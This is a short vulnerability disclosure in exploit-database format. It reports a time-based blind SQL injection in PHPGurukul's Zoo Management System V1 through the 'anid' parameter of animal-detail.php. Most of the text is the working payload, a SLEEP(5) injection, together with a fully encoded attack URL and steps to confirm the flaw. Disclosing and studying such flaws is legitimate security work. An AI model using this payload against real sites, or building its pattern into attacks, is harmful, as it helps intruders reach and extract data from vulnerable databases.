# Google Dork: N/A
# Date: 29/1/2021
# Exploit Author: Zeyad Azima
# Vendor Homepage: https://phpgurukul.com/
# Software Link: https://phpgurukul.com/zoo-management-system-using-php-and-mysql/
# Version: V1
# Tested on: Windows

# Identify the vulnerability

1- go to http://localhost/animals.php and click on an animal

2- then add the following payload to the url

payload: anid=9' AND (SELECT 8432 FROM (SELECT(SLEEP(5)))lMym) AND 'jMXh'='jMXh
url: http://localhost/animal-detail.php?anid=1%20anid=9%27%20AND%20(SELECT%208432%20FROM%20(SELECT(SLEEP(5)))lMym)%20AND%20%27jMXh%27=%27jMXh

If the web server makes you wait 5 seconds then it's vulnerable
